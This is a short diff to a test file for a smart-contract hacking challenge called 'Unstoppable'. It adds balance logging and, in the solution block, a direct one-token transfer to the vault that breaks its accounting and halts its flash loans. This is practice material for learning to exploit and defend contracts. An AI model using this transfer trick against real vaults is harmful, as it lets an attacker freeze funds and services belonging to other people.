@@ -41,10 +41,19 @@ describe('[Challenge] Unstoppable', function () {
             vault.address
         );
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
+        console.log("vault totalAssets:", (await token.balanceOf(vault.address)).toString())
+        console.log("vault totalSupply:", (await vault.totalSupply()).toString())
+        console.log("--")
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // console.log(INITIAL_PLAYER_TOKEN_BALANCE);
+        let t  = await (await ethers.getContractFactory('DamnValuableToken', player)).attach(token.address);
+        await t.transfer(vault.address, 1);
+        console.log("vault totalAssets:", (await token.balanceOf(vault.address)).toString())
+        console.log("vault totalSupply:", (await vault.totalSupply()).toString())
+        console.log("--")
     });
 
     after(async function () {
